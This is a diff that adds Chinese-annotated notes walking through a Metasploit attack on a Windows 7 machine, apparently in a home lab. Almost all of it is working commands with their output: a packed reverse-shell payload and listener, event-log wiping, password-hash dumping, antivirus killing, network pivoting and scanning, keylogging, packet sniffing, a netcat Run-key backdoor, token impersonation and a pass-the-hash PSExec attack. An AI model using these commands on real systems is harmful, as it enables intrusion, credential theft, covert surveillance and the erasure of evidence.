@@ -1,0 +1,418 @@
+win7同网段主机 渗透命令:
+#生成exe
+msfvenom -p windows/meterpreter/reverse_tcp lhost=192.168.1.15 lport=4452 -f exe > shell.exe
+
+#upx加密
+upx -9 shell.exe
+#上传到靶机
+
+#msfconsole 进入  开启监听器
+#设置
+msf6 > use exploit/multi/handler
+msf6 exploit(multi/handler) > set payload windows/meterpreter/reverse_tcp
+msf6 exploit(multi/handler) > set lhost 192.168.1.15
+#lhost => 192.168.1.15
+msf6 exploit(multi/handler) > set lport 4452
+#lport => 4452
+# msf6 exploit(multi/handler) > run
+# [*] Started reverse TCP handler on 192.168.1.15:4452 
+# [*] Sending stage (175686 bytes) to 192.168.1.48
+# [*] Meterpreter session 1 opened (192.168.1.15:4452 -> 192.168.1.48:49638) at 2023-06-27 22:19:08 +0800
+
+meterpreter > getuid
+#Server username: WIN7-USER\win7nat
+
+meterpreter > getsid
+#Server SID: S-1-5-21-2731094799-2883162553-1536624766-1000
+
+meterpreter > getpid
+#Current pid: 2460
+
+meterpreter > sysinfo
+# Computer        : WIN7-USER
+# OS              : Windows 7 (6.1 Build 7601, Service Pack 1).
+# Architecture    : x64
+# System Language : zh_CN
+# Domain          : XIAOBENDAN
+# Logged On Users : 2
+# Meterpreter     : x86/windows
+
+meterpreter > getwd
+#E:\downloads
+
+meterpreter > ls
+# Listing: E:\downloads
+# =====================
+# Mode              Size     Type  Last modified              Name
+# ----              ----     ----  -------------              ----
+# 100666/rw-rw-rw-  1574583  fil   2023-06-27 22:12:50 +0800  7z2301-x64.zip
+# 100666/rw-rw-rw-  114555   fil   2023-06-27 22:13:08 +0800  nc.zip
+# 100777/rwxrwxrwx  48128    fil   2023-06-27 22:17:26 +0800  shell.exe
+
+meterpreter > search -f "nc"
+# Found 7 results...
+# ==================
+# Path                                                   Size (bytes)  Modified (UTC)
+# ----                                                   ------------  --------------
+# C:\Users\win7nat\Contacts\win7nat.contact              68376         2023-06-20 00:48:01 +0800
+# C:\Users\win7nat\Links\Desktop.lnk                     435           2023-06-20 00:48:09 +0800
+# C:\Users\win7nat\Links\Downloads.lnk                   826           2023-06-20 00:48:09 +0800
+# C:\Users\win7nat\Links\RecentPlaces.lnk                335           2023-06-20 00:48:09 +0800
+# C:\Users\win7nat\Searches\Everywhere.search-ms         248           2023-06-20 00:48:07 +0800
+# C:\Users\win7nat\Searches\Indexed Locations.search-ms  248           2023-06-20 00:48:07 +0800
+# C:\Users\win7nat\nc.zip 
+
+meterpreter > clearev   #清除应用程序日志、系统日志、安全日志
+# [*] Wiping 434 records from Application...
+# [*] Wiping 2379 records from System...
+# [*] Wiping 429 records from Security...
+
+meterpreter > cat data.txt
+# momoda
+# ĬĬ��
+
+meterpreter > edit data.txt
+#vim 编辑器
+
+meterpreter > cat data.txt
+# 123123123
+# momoda
+# ĬĬ��
+
+meterpreter > rm data.txt
+
+meterpreter > mkdir data
+#Creating directory: data
+
+meterpreter > rmdir data
+#Removing directory: data
+
+meterpreter > upload //home//momoda//mybin//burp.der E:\\nc\\
+# [*] Uploading  : //home/momoda/mybin/burp.der -> E:\nc\burp.der
+# [*] Completed  : //home/momoda/mybin/burp.der -> E:\nc\burp.der
+
+meterpreter > ls E:\\nc
+# Listing: E:\nc
+# ==============
+# Mode              Size   Type  Last modified              Name
+# ----              ----   ----  -------------              ----
+# 100666/rw-rw-rw-  300    fil   2023-06-27 22:10:10 +0800  Makefile
+# 100666/rw-rw-rw-  940    fil   2023-06-27 23:30:37 +0800  burp.der
+
+meterpreter > download E:\\downloads\\test1.txt /home/momoda/Downloads/
+# [*] Downloading: E:\downloads\test1.txt -> /home/momoda/Downloads/test1.txt
+# [*] Downloaded 6.00 B of 6.00 B (100.0%): E:\downloads\test1.txt -> /home/momoda/Downloads/test1.txt
+# [*] Completed  : E:\downloads\test1.txt -> /home/momoda/Downloads/test1.txt
+
+meterpreter > getproxy
+# Auto-detect     : Yes
+# Auto config URL : 
+# Proxy URL       : 
+# Proxy Bypass    : 
+
+meterpreter > route
+# IPv4 network routes
+# ===================
+#     Subnet           Netmask          Gateway       Metric  Interface
+#     ------           -------          -------       ------  ---------
+#     0.0.0.0          0.0.0.0          192.168.1.1   10      11
+#     10.30.30.0       255.255.255.0    10.30.30.129  266     13
+#     10.30.30.129     255.255.255.255  10.30.30.129  266     13
+#     10.30.30.255     255.255.255.255  10.30.30.129  266     13
+#     127.0.0.0        255.0.0.0        127.0.0.1     306     1
+#     127.0.0.1        255.255.255.255  127.0.0.1     306     1
+#     127.255.255.255  255.255.255.255  127.0.0.1     306     1
+#     192.168.1.0      255.255.255.0    192.168.1.48  266     11
+#     192.168.1.48     255.255.255.255  192.168.1.48  266     11
+#     192.168.1.255    255.255.255.255  192.168.1.48  266     11
+#     224.0.0.0        240.0.0.0        127.0.0.1     306     1
+#     224.0.0.0        240.0.0.0        192.168.1.48  266     11
+#     224.0.0.0        240.0.0.0        10.30.30.129  266     13
+#     255.255.255.255  255.255.255.255  127.0.0.1     306     1
+#     255.255.255.255  255.255.255.255  192.168.1.48  266     11
+#     255.255.255.255  255.255.255.255  10.30.30.129  266     13
+
+portfwd add -l 6666 -p 3389 -r 127.0.0.1
+#端口转发，将目标机的3389端口转发到6666端口
+
+meterpreter > run autoroute -h
+# [!] Meterpreter scripts are deprecated. Try post/multi/manage/autoroute.
+# [!] Example: run post/multi/manage/autoroute OPTION=value [...]
+# [*] Usage:   run autoroute [-r] -s subnet -n netmask
+# [*] Examples:
+# [*]   run autoroute -s 10.1.1.0 -n 255.255.255.0  # Add a route to 10.10.10.1/255.255.255.0
+# [*]   run autoroute -s 10.10.10.1                 # Netmask defaults to 255.255.255.0
+# [*]   run autoroute -s 10.10.10.1/24              # CIDR notation is also okay
+# [*]   run autoroute -p                            # Print active routing table
+# [*]   run autoroute -d -s 10.10.10.1              # Deletes the 10.10.10.1/255.255.255.0 route
+# [*] Use the "route" and "ipconfig" Meterpreter commands to learn about available routes
+# [-] Deprecation warning: This script has been replaced by the post/multi/manage/autoroute module
+
+meterpreter > run autoroute -s 10.30.30.0/24
+# [!] Meterpreter scripts are deprecated. Try post/multi/manage/autoroute.
+# [!] Example: run post/multi/manage/autoroute OPTION=value [...]
+# [*] Adding a route to 10.30.30.0/255.255.255.0...
+# [+] Added route to 10.30.30.0/255.255.255.0 via 192.168.1.48
+# [*] Use the -p option to list all active routes
+
+meterpreter > run autoroute -p
+# [!] Meterpreter scripts are deprecated. Try post/multi/manage/autoroute.
+# [!] Example: run post/multi/manage/autoroute OPTION=value [...]
+# Active Routing Table
+# ====================
+#    Subnet             Netmask            Gateway
+#    ------             -------            -------
+#    10.30.30.0         255.255.255.0      Session 2
+
+
+meterpreter > run post/windows/gather/arp_scanner rhosts=10.30.30.0/24
+# [*] Running module against WIN7-USER
+# [*] ARP Scanning 10.30.30.0/24
+# [+]     IP: 10.30.30.1 MAC 00:50:56:c0:00:0e (VMware, Inc.)
+# [+]     IP: 10.30.30.129 MAC 00:0c:29:a7:d1:e3 (VMware, Inc.)
+# [+]     IP: 10.30.30.128 MAC 00:0c:29:c7:43:a1 (VMware, Inc.)
+# [+]     IP: 10.30.30.130 MAC 00:0c:29:24:30:37 (VMware, Inc.)
+# [+]     IP: 10.30.30.131 MAC 00:0c:29:6b:6f:cf (VMware, Inc.)
+# [+]     IP: 10.30.30.255 MAC 00:0c:29:a7:d1:e3 (VMware, Inc.)
+# [+]     IP: 10.30.30.254 MAC 00:50:56:ff:c2:e6 (VMware, Inc.)
+
+meterpreter > arp -a
+# ARP cache
+# =========
+#     IP address       MAC address        Interface
+#     ----------       -----------        ---------
+#     10.30.30.1       00:50:56:c0:00:0e  Intel(R) PRO/1000 MT Network Connection #2
+#     10.30.30.128     00:0c:29:c7:43:a1  Intel(R) PRO/1000 MT Network Connection #2
+#     10.30.30.130     00:0c:29:24:30:37  Intel(R) PRO/1000 MT Network Connection #2
+#     10.30.30.131     00:0c:29:6b:6f:cf  Intel(R) PRO/1000 MT Network Connection #2
+#     10.30.30.254     00:50:56:ff:c2:e6  Intel(R) PRO/1000 MT Network Connection #2
+#     10.30.30.255     ff:ff:ff:ff:ff:ff  Intel(R) PRO/1000 MT Network Connection #2
+#     192.168.1.1      70:8c:b6:ac:b1:a9  Intel(R) PRO/1000 MT Network Connection
+#     192.168.1.4      88:88:88:88:87:88  Intel(R) PRO/1000 MT Network Connection
+#     192.168.1.15     58:11:22:b4:db:a2  Intel(R) PRO/1000 MT Network Connection
+#     192.168.1.44     08:00:27:0d:b3:6a  Intel(R) PRO/1000 MT Network Connection
+#     192.168.1.255    ff:ff:ff:ff:ff:ff  Intel(R) PRO/1000 MT Network Connection
+#     224.0.0.22       00:00:00:00:00:00  Software Loopback Interface 1
+#     224.0.0.22       01:00:5e:00:00:16  Intel(R) PRO/1000 MT Network Connection
+#     224.0.0.22       01:00:5e:00:00:16  Intel(R) PRO/1000 MT Network Connection #2
+#     224.0.0.252      01:00:5e:00:00:fc  Intel(R) PRO/1000 MT Network Connection
+#     224.0.0.252      01:00:5e:00:00:fc  Intel(R) PRO/1000 MT Network Connection #2
+#     255.255.255.255  ff:ff:ff:ff:ff:ff  Intel(R) PRO/1000 MT Network Connection
+#     255.255.255.255  ff:ff:ff:ff:ff:ff  Intel(R) PRO/1000 MT Network Connection #2
+
+meterpreter > run auxiliary/scanner/portscan/tcp rhosts=10.30.30.130 ports=3389
+# [+] 10.30.30.130:         - 10.30.30.130:3389 - TCP OPEN
+# [*] 10.30.30.130:         - Scanned 1 of 1 hosts (100% complete)
+meterpreter > run auxiliary/scanner/portscan/tcp rhosts=10.30.30.129 ports=3389
+# [*] 10.30.30.129:         - Scanned 1 of 1 hosts (100% complete)
+
+meterpreter > hashdump #导出密码hash
+# Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+# Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+# win7nat:1000:aad3b435b51404eeaad3b435b51404ee:7dc7beb43b7caf66be0e82997dea148f:::
+
+meterpreter > migrate 464 #迁移进程
+# [*] Migrating from 2484 to 464...
+# [*] Migration completed successfully.
+
+meterpreter > run post/windows/manage/killav #关闭杀毒软件
+# [*] No target processes were found.
+
+meterpreter > run post/multi/manage/autoroute  #获取目标网段
+# [!] SESSION may not be compatible with this module:
+# [!]  * incompatible session platform: windows
+# [*] Running module against WIN7-USER
+# [*] Searching for subnets to autoroute.
+# [+] Route added to subnet 10.30.30.0/255.255.255.0 from host's routing table.
+# [+] Route added to subnet 192.168.1.0/255.255.255.0 from host's routing table.
+
+meterpreter > idletime #查看目标机 闲置时间
+# User has been idle for: 33 mins 51 secs
+
+meterpreter > hashdump  #获取密码hash  需要 system 权限
+# Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+# Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+# win7nat:1000:aad3b435b51404eeaad3b435b51404ee:7dc7beb43b7caf66be0e82997dea148f:::
+
+meterpreter > steal_token pid  #从制定进程中窃取token
+
+meterpreter > drop_token  #删除窃取的token
+
+
+
+RDP远程桌面:
+meterpreter > run post/windows/manage/enable_rdp #开启远程桌面,通过reg修改注册表
+# [*] Enabling Remote Desktop
+# [*]     RDP is disabled; enabling it ...
+# [*] Setting Terminal Services service startup mode
+# [*]     The Terminal Services service is not set to auto, changing it to auto ...
+# [*]     Opening port in local firewall if necessary
+# [*] For cleanup execute Meterpreter resource file: /home/momoda/.msf4/loot/20230708233739_default_192.168.1.48_host.windows.cle_781363.txt
+
+meterpreter > run post/windows/manage/enable_rdp username=momoda password=123456
+#添加用户 调用cmd.exe,通过 net user 添加
+
+meterpreter > run post/windows/manage/enable_rdp forward=true lport=6662
+#将3389端口转发到6662  利用 portfwd 命令
+
+
+键盘记录:
+meterpreter > keyscan_start #开始键盘记录
+# Starting the keystroke sniffer ...
+
+meterpreter > keyscan_stop #结束键盘记录
+# Stopping the keystroke sniffer...
+
+meterpreter > keyscan_dump #获取键盘记录内容
+# Dumping captured keystrokes...
+
+系统和补丁:
+meterpreter > run post/windows/gather/checkvm  #校验 是否windows虚拟机
+# [*] Checking if the target is a Virtual Machine ...
+# [+] This is a VMware Virtual Machine
+
+meterpreter > run post/linux/gather/checkvm  #校验 是否linux虚拟机
+# [!] SESSION may not be compatible with this module:
+# [!]  * incompatible session platform: windows
+# [*] Gathering System info ....
+
+meterpreter > run post/windows/gather/enum_patches  #查看补丁信息
+# [*] Running module against WIN7-USER (192.168.1.48)
+# Installed Patches
+# =================
+#   HotFix ID  Install Date
+#   ---------  ------------
+#   KB2534111  6/19/2023
+#   KB2999226  6/27/2023
+#   KB976902   11/21/2010
+# [*] Patch list saved to /home/momoda/.msf4/loot/20230709000033_default_192.168.1.48_enum_patches_488292.txt
+
+
+sniffer 抓包:
+meterpreter > use sniffer #加载sniffer抓包模块
+# Loading extension sniffer...Success.
+
+meterpreter > sniffer_interfaces #查看网卡
+# 1 - 'WAN Miniport (Network Monitor)' ( type:3 mtu:1514 usable:true dhcp:false wifi:false )
+# 2 - 'Intel(R) PRO/1000 MT Network Connection' ( type:0 mtu:1514 usable:true dhcp:true wifi:false )
+# 3 - 'Intel(R) PRO/1000 MT Network Connection' ( type:0 mtu:1514 usable:true dhcp:true wifi:false )
+
+meterpreter > sniffer_start 2 #选择网卡 开始抓包
+# [*] Capture started on interface 2 (50000 packet buffer)
+
+meterpreter > sniffer_dump 2 /tmp/test.pcap #到处pcap数据包
+# [*] Flushing packet capture buffer for interface 2...
+# [*] Flushed 34 packets (2744 bytes)
+# [*] Downloaded 100% (2744/2744)...
+# [*] Download completed, converting to PCAP...
+# [*] PCAP file written to /tmp/test.pcap
+
+meterpreter > sniffer_stop 2 #停止抓包
+# [*] Capture stopped on interface 2
+# [*] There are 34 packets (2064 bytes) remaining
+# [*] Download or release them using 'sniffer_dump' or 'sniffer_release'
+
+
+注册表 设置后门 nc:
+meterpreter > reg -h #查看帮助
+# -d  注册表中值的数据
+# -k  注册表键路径
+# -v  注册表键名称
+# enumkey   枚举可获得的键
+# setval    设置键值
+# queryval  查询键值数据
+
+meterpreter > upload /home/momoda/nc.exe C:\\windows\\system32 #上传nc
+
+meterpreter > reg enumkey -k HKLM\\software\\microsoft\\windows\\currentversion\\run
+#枚举run下的key
+
+meterpreter > reg setval -k HKLM\\software\\microsoft\\windows\\currentversion\\run -v 
+lltest_nc -d 'C:\windows\system32\nc.exe -Ldp 9999 -e cmd.exe'
+#设置键值
+
+meterpreter > reg queryval -k HKLM\\software\\microsoft\\windows\\currentversion\\run -v lltest_cc
+#查看键值
+
+#kali终端执行
+nc -v 192.168.159.144 9999 #攻击者连接nc后门
+
+
+incognito假冒令牌:
+meterpreter > use incognito  #加载模块
+# Loading extension incognito...Success.
+
+meterpreter > list_tokens -u  #系统权限  用户token
+# Delegation Tokens Available
+# ========================================
+# NT AUTHORITY\LOCAL SERVICE
+# NT AUTHORITY\NETWORK SERVICE
+# NT AUTHORITY\SYSTEM
+# WIN7-USER\win7nat
+
+meterpreter > list_tokens -g  #普通用户权限  用户组token
+# [-] Warning: Not currently running as SYSTEM, not all tokens will be available
+#              Call rev2self if primary process token is SYSTEM
+# Delegation Tokens Available
+# ========================================
+# \控制台登录
+# BUILTIN\Users
+# NT AUTHORITY\Authenticated Users
+# NT AUTHORITY\INTERACTIVE
+# NT AUTHORITY\NTLM Authentication
+# NT AUTHORITY\This Organization
+
+meterpreter > impersonate_token 'NT AUTHORITY\INTERACTIVE'  #没有可窃取用户组的token
+# [-] Warning: Not currently running as SYSTEM, not all tokens will be available
+#              Call rev2self if primary process token is SYSTEM
+# [+] Delegation token available
+# [+] Successfully impersonated user WIN7-USER\win7nat
+
+meterpreter > rev2self #返回原始token
+
+
+PSExec哈希传递:
+通过smart_hashdump获取用户哈希后 可以利用psexec模块进行哈系传递攻击
+# 前提条件:
+#   1.开启445端口 smb服务
+#   2.开启 admin$ 共享
+
+msf > use exploit/windows/smb/psexec  #use 模块
+
+msf6 exploit(windows/smb/psexec) > set payload windows/meterpreter/reverse_tcp
+# payload => windows/meterpreter/reverse_tcp
+
+msf6 exploit(windows/smb/psexec) > set lhost 192.168.1.15
+# lhost => 192.168.1.15
+
+msf6 exploit(windows/smb/psexec) > set lport 4458
+# lport => 4458
+
+msf6 exploit(windows/smb/psexec) > set rhosts 192.168.1.100
+# rhosts => 192.168.1.100
+
+msf6 exploit(windows/smb/psexec) > set smbuser Administrator
+# smbuser => Administrator
+
+msf6 exploit(windows/smb/psexec) > set smbpass Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0
+# smbpass => Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+
+msf6 exploit(windows/smb/psexec) > set smbdomain momoda.com
+# smbdomain => momoda.com
+
+msf6 exploit(windows/smb/psexec) > run  #开始攻击
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
